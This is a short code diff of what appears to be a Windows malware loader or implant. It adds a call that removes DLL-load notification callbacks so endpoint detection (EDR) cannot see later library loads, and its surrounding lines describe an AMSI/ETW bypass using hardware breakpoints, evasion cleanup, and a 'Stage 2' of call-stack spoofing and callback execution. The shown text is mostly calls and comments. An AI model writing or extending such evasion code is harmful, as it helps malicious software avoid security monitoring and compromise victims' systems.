@@ -52,6 +52,11 @@ int Main(VOID) {
     if (!InitializeWinApis(&WinApis))
         return 0;
 
+    // --- Blind EDR DLL load monitoring ---
+    // Removes all LdrRegisterDllNotification callbacks so EDR
+    // can't see subsequent LoadLibrary calls (amsi, wininet, ktmw32)
+    BlindDllNotifications(&WinApis);
+
     // --- Patchless AMSI/ETW bypass ---
     // VEH + hardware breakpoints on EtwEventWrite/AmsiScanBuffer
     // NtContinue sets DR0/DR1 without ETW-TI telemetry
@@ -204,7 +209,6 @@ int Main(VOID) {
 
     CleanupEvasion(&WinApis);
     LOG("[+] Evasion cleanup complete");
-
 
     // ============================================================
     // Stage 2: Call Stack Spoofing + Callback Execution
